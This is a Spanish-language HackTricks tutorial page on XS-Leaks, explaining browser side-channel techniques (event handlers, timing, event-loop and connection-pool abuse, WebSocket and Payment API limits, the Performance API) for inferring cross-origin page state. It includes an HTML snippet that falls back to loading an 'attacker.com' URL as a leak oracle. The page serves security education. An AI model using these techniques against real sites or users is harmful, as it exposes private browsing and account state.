# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f谩cilmente con las herramientas comunitarias **m谩s avanzadas** del mundo.\
Accede hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informaci贸n B谩sica

XS-Search es un m茅todo utilizado para **extraer informaci贸n de origen cruzado** aprovechando **vulnerabilidades de canal lateral**.

Los componentes clave involucrados en este ataque incluyen:

* **Web Vulnerable**: El sitio web objetivo del cual se pretende extraer informaci贸n.
* **Web del Atacante**: El sitio web malicioso creado por el atacante, que la v铆ctima visita, alojando el exploit.
* **M茅todo de Inclusi贸n**: La t茅cnica empleada para incorporar la Web Vulnerable en la Web del Atacante (por ejemplo, window.open, iframe, fetch, etiqueta HTML con href, etc.).
* **T茅cnica de Fuga**: T茅cnicas utilizadas para discernir diferencias en el estado de la Web Vulnerable basadas en la informaci贸n recopilada a trav茅s del m茅todo de inclusi贸n.
* **Estados**: Las dos condiciones potenciales de la Web Vulnerable, que el atacante busca distinguir.
* **Diferencias Detectables**: Variaciones observables en las que el atacante se basa para inferir el estado de la Web Vulnerable.

### Diferencias Detectables

Varios aspectos pueden analizarse para diferenciar los estados de la Web Vulnerable:

* **C贸digo de Estado**: Distinguir entre **varios c贸digos de estado de respuesta HTTP** de origen cruzado, como errores de servidor, errores de cliente o errores de autenticaci贸n.
* **Uso de API**: Identificar **el uso de APIs web** en las p谩ginas, revelando si una p谩gina de origen cruzado emplea una API web espec铆fica de JavaScript.
* **Redirecciones**: Detectar navegaciones a diferentes p谩ginas, no solo redirecciones HTTP, sino tambi茅n aquellas desencadenadas por JavaScript o HTML.
* **Contenido de la P谩gina**: Observar **variaciones en el cuerpo de la respuesta HTTP** o en los subrecursos de la p谩gina, como el **n煤mero de marcos incrustados** o disparidades de tama帽o en im谩genes.
* **Encabezado HTTP**: Notar la presencia o posiblemente el valor de un **encabezado de respuesta HTTP espec铆fico**, incluidos encabezados como X-Frame-Options, Content-Disposition y Cross-Origin-Resource-Policy.
* **Tiempo**: Observar disparidades de tiempo consistentes entre los dos estados.

### M茅todos de Inclusi贸n

* **Elementos HTML**: HTML ofrece varios elementos para **inclusi贸n de recursos de origen cruzado**, como hojas de estilo, im谩genes o scripts, obligando al navegador a solicitar un recurso no HTML. Una recopilaci贸n de posibles elementos HTML para este prop贸sito se puede encontrar en [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
* **Marcos**: Elementos como **iframe**, **object** y **embed** pueden incrustar recursos HTML directamente en la p谩gina del atacante. Si la p谩gina **carece de protecci贸n de enmarcado**, JavaScript puede acceder al objeto window del recurso enmarcado a trav茅s de la propiedad contentWindow.
* **Pop-ups**: El m茅todo **`window.open`** abre un recurso en una nueva pesta帽a o ventana, proporcionando un **identificador de ventana** para que JavaScript interact煤e con m茅todos y propiedades siguiendo la SOP. Los pop-ups, a menudo utilizados en inicio de sesi贸n 煤nico, evitan las restricciones de enmarcado y cookies de un recurso objetivo. Sin embargo, los navegadores modernos restringen la creaci贸n de pop-ups a ciertas acciones del usuario.
* **Solicitudes JavaScript**: JavaScript permite solicitudes directas a recursos objetivo utilizando **XMLHttpRequests** o la **Fetch API**. Estos m茅todos ofrecen un control preciso sobre la solicitud, como optar por seguir redirecciones HTTP.

### T茅cnicas de Fuga

* **Manejador de Eventos**: Una t茅cnica de fuga cl谩sica en XS-Leaks, donde los manejadores de eventos como **onload** y **onerror** proporcionan informaci贸n sobre el 茅xito o fracaso de la carga de recursos.
* **Mensajes de Error**: Excepciones de JavaScript o p谩ginas de error especiales pueden proporcionar informaci贸n de fuga directamente desde el mensaje de error o diferenciando entre su presencia y ausencia.
* **L铆mites Globales**: Limitaciones f铆sicas de un navegador, como la capacidad de memoria u otros l铆mites impuestos por el navegador, pueden indicar cu谩ndo se alcanza un umbral, sirviendo como t茅cnica de fuga.
* **Estado Global**: Las interacciones detectables con los **estados globales de los navegadores** (por ejemplo, la interfaz History) pueden ser explotadas. Por ejemplo, el **n煤mero de entradas** en el historial de un navegador puede ofrecer pistas sobre p谩ginas de origen cruzado.
* **API de Rendimiento**: Esta API proporciona **detalles de rendimiento de la p谩gina actual**, incluidos los tiempos de red para el documento y los recursos cargados, permitiendo inferencias sobre los recursos solicitados.
* **Atributos Legibles**: Algunos atributos HTML son **legibles de origen cruzado** y pueden utilizarse como t茅cnica de fuga. Por ejemplo, la propiedad `window.frame.length` permite a JavaScript contar los marcos incluidos en una p谩gina web de origen cruzado.

## Herramienta XSinator y Documento

XSinator es una herramienta autom谩tica para **verificar navegadores contra varios XS-Leaks conocidos** explicados en su documento: [**https://xsinator.com/paper.pdf**](https://xsinator.com/paper.pdf)

Puedes **acceder a la herramienta en** [**https://xsinator.com/**](https://xsinator.com/)

{% hint style="warning" %}
**XS-Leaks Excluidos**: Tuvimos que excluir XS-Leaks que dependen de **service workers** ya que interferir铆an con otras fugas en XSinator. Adem谩s, elegimos **excluir XS-Leaks que dependen de configuraciones incorrectas y errores en una aplicaci贸n web espec铆fica**. Por ejemplo, configuraciones incorrectas de Compartir Recursos de Origen Cruzado (CORS), fugas de postMessage o Cross-Site Scripting. Adem谩s, excluimos XS-Leaks basados en tiempo ya que a menudo sufren de ser lentos, ruidosos e inexactos.
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f谩cilmente con las herramientas comunitarias **m谩s avanzadas** del mundo.\
Accede hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
## **T茅cnicas basadas en tiempo**

Algunas de las siguientes t茅cnicas van a utilizar el tiempo como parte del proceso para detectar diferencias en los posibles estados de las p谩ginas web. Hay diferentes formas de medir el tiempo en un navegador web.

**Relojes**: La API [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now) permite a los desarrolladores obtener medidas de tiempo de alta resoluci贸n.\
Hay una cantidad considerable de APIs que los atacantes pueden abusar para crear relojes impl铆citos: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), animaciones CSS, entre otros.\
Para m谩s informaci贸n: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## T茅cnicas de Manejador de Eventos

### Onload/Onerror

* **M茅todos de Inclusi贸n**: Marcos, Elementos HTML
* **Diferencia Detectable**: C贸digo de Estado
* **M谩s informaci贸n**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Resumen**: si se intenta cargar un recurso y se activan los eventos onerror/onload cuando el recurso se carga con 茅xito/no con 茅xito, es posible averiguar el c贸digo de estado.
* **Ejemplo de c贸digo**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

El ejemplo de c贸digo intenta **cargar objetos de scripts desde JS**, pero **otros tags** como objetos, hojas de estilo, im谩genes, audios tambi茅n podr铆an ser utilizados. Adem谩s, tambi茅n es posible inyectar directamente el **tag** y declarar los eventos `onload` y `onerror` dentro del tag (en lugar de inyectarlo desde JS).

Tambi茅n existe una versi贸n de este ataque sin scripts:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
En este caso, si `example.com/404` no se encuentra, se cargar谩 `attacker.com/?error`.

### Tiempo de carga

* **M茅todos de inclusi贸n**: Elementos HTML
* **Diferencia detectable**: Tiempo (generalmente debido al contenido de la p谩gina, c贸digo de estado)
* **M谩s informaci贸n**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Resumen:** La **API** [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) se puede utilizar para medir cu谩nto tiempo se tarda en realizar una solicitud. Sin embargo, se podr铆an utilizar otros relojes, como la [**API PerformanceLongTaskTiming**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) que puede identificar tareas que se ejecutan durante m谩s de 50 ms.
* **Ejemplo de c贸digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) otro ejemplo en:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Tiempo de carga + Tarea pesada forzada

Esta t茅cnica es similar a la anterior, pero el **atacante** tambi茅n **forzar谩** alguna acci贸n para que tome un **tiempo relevante** cuando la **respuesta sea positiva o negativa** y medir谩 ese tiempo.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### Tiempo de descarga/cierre antes de la descarga

* **M茅todos de inclusi贸n**: Marcos
* **Diferencia detectable**: Tiempo (generalmente debido al contenido de la p谩gina, c贸digo de estado)
* **M谩s informaci贸n**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Resumen:** El reloj [SharedArrayBuffer](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) se puede utilizar para medir cu谩nto tiempo se tarda en realizar una solicitud. Se podr铆an utilizar otros relojes.
* **Ejemplo de c贸digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

El tiempo que se tarda en buscar un recurso se puede medir utilizando los eventos [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) y [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event). El evento **`beforeunload`** se dispara cuando el navegador est谩 a punto de navegar a una nueva p谩gina, mientras que el evento **`unload`** ocurre cuando la navegaci贸n realmente est谩 teniendo lugar. La diferencia de tiempo entre estos dos eventos se puede calcular para determinar la **duraci贸n que el navegador pas贸 buscando el recurso**.

### Tiempo de marco con restricciones + carga <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **M茅todos de inclusi贸n**: Marcos
* **Diferencia detectable**: Tiempo (generalmente debido al contenido de la p谩gina, c贸digo de estado)
* **M谩s informaci贸n**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Resumen:** La **API** [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) se puede utilizar para medir cu谩nto tiempo se tarda en realizar una solicitud. Se podr铆an utilizar otros relojes.
* **Ejemplo de c贸digo**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Se ha observado que en ausencia de [Protecciones de Enmarcado](https://xsleaks.dev/docs/defenses/opt-in/xfo/), un atacante puede medir el tiempo requerido para que una p谩gina y sus subrecursos se carguen a trav茅s de la red. Esta medici贸n es t铆picamente posible porque el controlador `onload` de un iframe se activa solo despu茅s de completarse la carga de recursos y la ejecuci贸n de JavaScript. Para evitar la variabilidad introducida por la ejecuci贸n de scripts, un atacante podr铆a emplear el atributo [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) dentro del `<iframe>`. La inclusi贸n de este atributo restringe numerosas funcionalidades, especialmente la ejecuci贸n de JavaScript, facilitando as铆 una medici贸n que est谩 predominantemente influenciada por el rendimiento de la red.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + error + onload

* **M茅todos de Inclusi贸n**: Marcos
* **Diferencia Detectable**: Contenido de la P谩gina
* **M谩s informaci贸n**:
* **Resumen**: Si puedes hacer que la p谩gina genere un error cuando se accede al contenido correcto y cargarla correctamente cuando se accede a cualquier contenido, entonces puedes hacer un bucle para extraer toda la informaci贸n sin medir el tiempo.
* **Ejemplo de C贸digo**:

Supongamos que puedes **insertar** la **p谩gina** que tiene el **contenido secreto** **dentro de un Iframe**.

Puedes hacer que la v铆ctima busque el archivo que contiene "_**flag**_" usando un **Iframe** (explotando un CSRF, por ejemplo). Dentro del Iframe, sabes que el _**evento onload**_ se **ejecutar谩 siempre al menos una vez**. Luego, puedes **cambiar** la **URL** del **iframe** pero cambiando solo el **contenido** del **hash** dentro de la URL.

Por ejemplo:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Si la primera URL se **carg贸 correctamente**, entonces, al **cambiar** la parte del **hash** de la URL, el evento **onload** no se **activar谩** nuevamente. Pero **si** la p谩gina tuvo alg煤n tipo de **error** al **cargarse**, entonces, el evento **onload** se **activar谩 nuevamente**.

Entonces, puedes **distinguir entre** una p谩gina **cargada correctamente** o una p谩gina que tiene un **error** al ser accedida.

### Ejecuci贸n de Javascript

* **M茅todos de Inclusi贸n**: Marcos
* **Diferencia Detectable**: Contenido de la P谩gina
* **M谩s informaci贸n**:
* **Resumen**: Si la **p谩gina** est谩 **devolviendo** el **contenido sensible**, **o** un **contenido** que puede ser **controlado** por el usuario. El usuario podr铆a establecer **c贸digo JS v谩lido en el caso negativo**, y **cargar** cada intento dentro de las etiquetas **`<script>`**, por lo que en los casos **negativos** el c贸digo de los atacantes se **ejecuta**, y en los casos **afirmativos** no se ejecutar谩 **nada**.
* **Ejemplo de C贸digo**:

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **M茅todos de Inclusi贸n**: Elementos HTML
* **Diferencia Detectable**: C贸digo de Estado y Encabezados
* **M谩s informaci贸n**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Resumen**: **Cross-Origin Read Blocking (CORB)** es una medida de seguridad que evita que las p谩ginas web carguen ciertos recursos sensibles de origen cruzado para protegerse contra ataques como **Spectre**. Sin embargo, los atacantes pueden explotar su comportamiento protector. Cuando una respuesta sujeta a **CORB** devuelve un `Content-Type` protegido por **CORB** con `nosniff` y un c贸digo de estado `2xx`, **CORB** elimina el cuerpo y los encabezados de la respuesta. Los atacantes que observan esto pueden inferir la combinaci贸n del **c贸digo de estado** (indicando 茅xito o error) y el `Content-Type` (indicando si est谩 protegido por **CORB**), lo que lleva a una posible fuga de informaci贸n.
* **Ejemplo de C贸digo**:

Consulta el enlace de m谩s informaci贸n para obtener m谩s detalles sobre el ataque.

### onblur

* **M茅todos de Inclusi贸n**: Marcos
* **Diferencia Detectable**: Contenido de la P谩gina
* **M谩s informaci贸n**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Resumen**: Filtrar datos sensibles del atributo id o name.
* **Ejemplo de C贸digo**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Es posible **cargar una p谩gina** dentro de un **iframe** y usar el **`#id_value`** para hacer que la p谩gina se **enfoque en el elemento** del iframe con el id indicado, luego si se activa una se帽al **`onblur`**, el elemento ID existe.\
Puedes realizar el mismo ataque con etiquetas **`portal`**.

### Transmisiones de postMessage <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **M茅todos de Inclusi贸n**: Marcos, Pop-ups
* **Diferencia Detectable**: Uso de API
* **M谩s informaci贸n**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Resumen**: Recopilar informaci贸n sensible de un postMessage o utilizar la presencia de postMessages como un or谩culo para conocer el estado del usuario en la p谩gina.
* **Ejemplo de C贸digo**: `Cualquier c贸digo escuchando todos los postMessages.`

Las aplicaciones utilizan con frecuencia las transmisiones de [`postMessage`](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) para comunicarse entre diferentes or铆genes. Sin embargo, este m茅todo puede exponer inadvertidamente **informaci贸n sensible** si el par谩metro `targetOrigin` no est谩 especificado correctamente, lo que permite que cualquier ventana reciba los mensajes. Adem谩s, el simple acto de recibir un mensaje puede actuar como un **or谩culo**; por ejemplo, ciertos mensajes solo podr铆an enviarse a usuarios que hayan iniciado sesi贸n. Por lo tanto, la presencia o ausencia de estos mensajes puede revelar informaci贸n sobre el estado o la identidad del usuario, como si est谩n autenticados o no.

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f谩cilmente con las herramientas comunitarias m谩s avanzadas del mundo.\
Obt茅n acceso hoy:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## T茅cnicas de L铆mites Globales

### API de WebSocket

* **M茅todos de Inclusi贸n**: Marcos, Pop-ups
* **Diferencia Detectable**: Uso de API
* **M谩s informaci贸n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Resumen**: Agotar el l铆mite de conexi贸n de WebSocket revela el n煤mero de conexiones WebSocket de una p谩gina de origen cruzado.
* **Ejemplo de C贸digo**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

Es posible identificar si, y cu谩ntas, **conexiones WebSocket utiliza una p谩gina objetivo**. Esto permite a un atacante detectar estados de aplicaci贸n y filtrar informaci贸n vinculada al n煤mero de conexiones WebSocket.

Si un **origen** utiliza la **cantidad m谩xima de objetos de conexi贸n WebSocket**, independientemente de su estado de conexi贸n, la creaci贸n de **nuevos objetos resultar谩 en excepciones de JavaScript**. Para ejecutar este ataque, el sitio web del atacante abre el sitio web objetivo en un pop-up o iframe y luego, despu茅s de que se haya cargado el sitio web objetivo, intenta crear el n煤mero m谩ximo posible de conexiones WebSocket. El **n煤mero de excepciones lanzadas** es el **n煤mero de conexiones WebSocket utilizadas por la ventana del sitio web objetivo**.
### API de Pago

* **M茅todos de Inclusi贸n**: Marcos, Pop-ups
* **Diferencia Detectable**: Uso de API
* **M谩s informaci贸n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Resumen**: Detectar la Solicitud de Pago porque solo una puede estar activa a la vez.
* **Ejemplo de C贸digo**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Este XS-Leak permite a un atacante **detectar cu谩ndo una p谩gina de origen cruzado inicia una solicitud de pago**.

Debido a que **solo una solicitud de pago puede estar activa** al mismo tiempo, si el sitio web objetivo est谩 utilizando la API de Solicitud de Pago, cualquier **otro intento de usar esta API fallar谩**, y causar谩 una **excepci贸n de JavaScript**. El atacante puede aprovechar esto al **intentar peri贸dicamente mostrar la interfaz de la API de Pago**. Si un intento causa una excepci贸n, significa que el sitio web objetivo la est谩 utilizando en ese momento. El atacante puede ocultar estos intentos peri贸dicos cerrando inmediatamente la interfaz despu茅s de crearla.

### Temporizaci贸n del Bucle de Eventos <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **M茅todos de Inclusi贸n**:
* **Diferencia Detectable**: Temporizaci贸n (generalmente debido al Contenido de la P谩gina, C贸digo de Estado)
* **M谩s informaci贸n**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Resumen:** Medir el tiempo de ejecuci贸n de una web abusando del bucle de eventos JS de un solo hilo.
* **Ejemplo de C贸digo**:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript opera en un [modelo de concurrencia de bucle de eventos de un solo hilo](https://developer.mozilla.org/en-US/docs/Web/JavaScript/EventLoop), lo que significa que **solo puede ejecutar una tarea a la vez**. Esta caracter铆stica puede ser explotada para medir **cu谩nto tiempo tarda en ejecutarse el c贸digo de un origen diferente**. Un atacante puede medir el tiempo de ejecuci贸n de su propio c贸digo en el bucle de eventos al despachar continuamente eventos con propiedades fijas. Estos eventos se procesar谩n cuando el grupo de eventos est茅 vac铆o. Si otros or铆genes tambi茅n est谩n despachando eventos al mismo grupo, un **atacante puede inferir el tiempo que tardan en ejecutarse estos eventos externos observando retrasos en la ejecuci贸n de sus propias tareas**. Este m茅todo de monitoreo del bucle de eventos para detectar retrasos puede revelar el tiempo de ejecuci贸n del c贸digo de diferentes or铆genes, exponiendo potencialmente informaci贸n sensible.

{% hint style="warning" %}
En una temporizaci贸n de ejecuci贸n es posible **eliminar** **factores de red** para obtener **mediciones m谩s precisas**. Por ejemplo, cargando los recursos utilizados por la p谩gina antes de cargarla.
{% endhint %}

### Bucle de Eventos Ocupado <a href="#busy-event-loop" id="busy-event-loop"></a>

* **M茅todos de Inclusi贸n**:
* **Diferencia Detectable**: Temporizaci贸n (generalmente debido al Contenido de la P谩gina, C贸digo de Estado)
* **M谩s informaci贸n**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Resumen:** Un m茅todo para medir el tiempo de ejecuci贸n de una operaci贸n web implica bloquear intencionalmente el bucle de eventos de un hilo y luego medir **cu谩nto tiempo tarda en estar disponible nuevamente el bucle de eventos**. Al insertar una operaci贸n de bloqueo (como un c谩lculo largo o una llamada de API s铆ncrona) en el bucle de eventos, y monitorear el tiempo que tarda en comenzar la ejecuci贸n del c贸digo posterior, se puede inferir la duraci贸n de las tareas que se estaban ejecutando en el bucle de eventos durante el per铆odo de bloqueo. Esta t茅cnica aprovecha la naturaleza de un solo hilo del bucle de eventos de JavaScript, donde las tareas se ejecutan secuencialmente, y puede proporcionar informaci贸n sobre el rendimiento o comportamiento de otras operaciones que comparten el mismo hilo.
* **Ejemplo de C贸digo**:

Una ventaja significativa de la t茅cnica de medir el tiempo de ejecuci贸n bloqueando el bucle de eventos es su potencial para eludir el **Aislamiento de Sitio**. El **Aislamiento de Sitio** es una caracter铆stica de seguridad que separa diferentes sitios web en procesos separados, con el objetivo de evitar que los sitios maliciosos accedan directamente a datos sensibles de otros sitios. Sin embargo, al influir en la temporizaci贸n de ejecuci贸n de otro origen a trav茅s del bucle de eventos compartido, un atacante puede extraer indirectamente informaci贸n sobre las actividades de ese origen. Este m茅todo no depende del acceso directo a los datos del otro origen, sino que observa el impacto de las actividades de ese origen en el bucle de eventos compartido, evitando as铆 las barreras protectoras establecidas por el **Aislamiento de Sitio**.

{% hint style="warning" %}
En una temporizaci贸n de ejecuci贸n es posible **eliminar** **factores de red** para obtener **mediciones m谩s precisas**. Por ejemplo, cargando los recursos utilizados por la p谩gina antes de cargarla.
{% endhint %}

### Pool de Conexiones

* **M茅todos de Inclusi贸n**: Solicitudes JavaScript
* **Diferencia Detectable**: Temporizaci贸n (generalmente debido al Contenido de la P谩gina, C贸digo de Estado)
* **M谩s informaci贸n**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Resumen:** Un atacante podr铆a bloquear todos los sockets excepto 1, cargar la web objetivo y al mismo tiempo cargar otra p谩gina, el tiempo hasta que la 煤ltima p谩gina comience a cargarse es el tiempo que tard贸 en cargar la p谩gina objetivo.
* **Ejemplo de C贸digo**:

{% content-ref url="xs-search/connection-pool-example.md" %}
[connection-pool-example.md](xs-search/connection-pool-example.md)
{% endcontent-ref %}

Los navegadores utilizan sockets para la comunicaci贸n con el servidor, pero debido a los recursos limitados del sistema operativo y el hardware, los **navegadores se ven obligados a imponer un l铆mite** en el n煤mero de sockets concurrentes. Los atacantes pueden explotar esta limitaci贸n a trav茅s de los siguientes pasos:

1. Asegurar el l铆mite de sockets del navegador, por ejemplo, 256 sockets globales.
2. Ocupar 255 sockets durante un per铆odo prolongado iniciando 255 solicitudes a varios hosts, dise帽adas para mantener las conexiones abiertas sin completar.
3. Utilizar el 256潞 socket para enviar una solicitud a la p谩gina objetivo.
4. Intentar una 257陋 solicitud a un host diferente. Dado que todos los sockets est谩n en uso (seg煤n los pasos 2 y 3), esta solicitud se encolar谩 hasta que un socket est茅 disponible. El retraso antes de que esta solicitud contin煤e proporciona al atacante informaci贸n sobre la temporizaci贸n de la actividad de red relacionada con el 256潞 socket (el socket de la p谩gina objetivo). Esta inferencia es posible porque los 255 sockets del paso 2 a煤n est谩n ocupados, lo que implica que cualquier socket reci茅n disponible debe ser el liberado en el paso 3. El tiempo que tarda en estar disponible el 256潞 socket est谩 directamente relacionado con el tiempo requerido para que la solicitud a la p谩gina objetivo se complete.

Para m谩s informaci贸n: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
## T茅cnicas de la API de Rendimiento

La [`API de Rendimiento`](https://developer.mozilla.org/es/docs/Web/API/Performance) ofrece informaci贸n sobre las m茅tricas de rendimiento de las aplicaciones web, enriquecida por la [`API de Temporizaci贸n de Recursos`](https://developer.mozilla.org/es/docs/Web/API/Resource_Timing_API). La API de Temporizaci贸n de Recursos permite monitorear los tiempos detallados de las solicitudes de red, como la duraci贸n de las solicitudes. Es importante destacar que cuando los servidores incluyen el encabezado `Timing-Allow-Origin: *` en sus respuestas, se obtienen datos adicionales como el tama帽o de transferencia y el tiempo de b煤squeda de dominio.

Esta gran cantidad de datos se puede recuperar mediante m茅todos como [`performance.getEntries`](https://developer.mozilla.org/es/docs/Web/API/Performance/getEntries) o [`performance.getEntriesByName`](https://developer.mozilla.org/es/docs/Web/API/Performance/getEntriesByName), lo que proporciona una visi贸n integral de la informaci贸n relacionada con el rendimiento. Adem谩s, la API facilita la medici贸n de los tiempos de ejecuci贸n al calcular la diferencia entre marcas de tiempo obtenidas de [`performance.now()`](https://developer.mozilla.org/es/docs/Web/API/Performance/now). Sin embargo, es importante tener en cuenta que para ciertas operaciones en navegadores como Chrome, la precisi贸n de `performance.now()` puede estar limitada a milisegundos, lo que podr铆a afectar la granularidad de las mediciones de tiempo.

M谩s all谩 de las mediciones de tiempo, la API de Rendimiento se puede aprovechar para obtener informaci贸n relacionada con la seguridad. Por ejemplo, la presencia o ausencia de p谩ginas en el objeto `performance` en Chrome puede indicar la aplicaci贸n de `X-Frame-Options`. Espec铆ficamente, si una p谩gina est谩 bloqueada para renderizarse en un marco debido a `X-Frame-Options`, no se registrar谩 en el objeto `performance`, lo que proporciona una pista sutil sobre las pol铆ticas de enmarcado de la p谩gina.

### Fuga de Errores

* **M茅todos de Inclusi贸n**: Marcos, Elementos HTML
* **Diferencia Detectable**: C贸digo de Estado
* **M谩s informaci贸n**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Resumen:** Una solicitud que resulta en errores no crear谩 una entrada de temporizaci贸n de recursos.
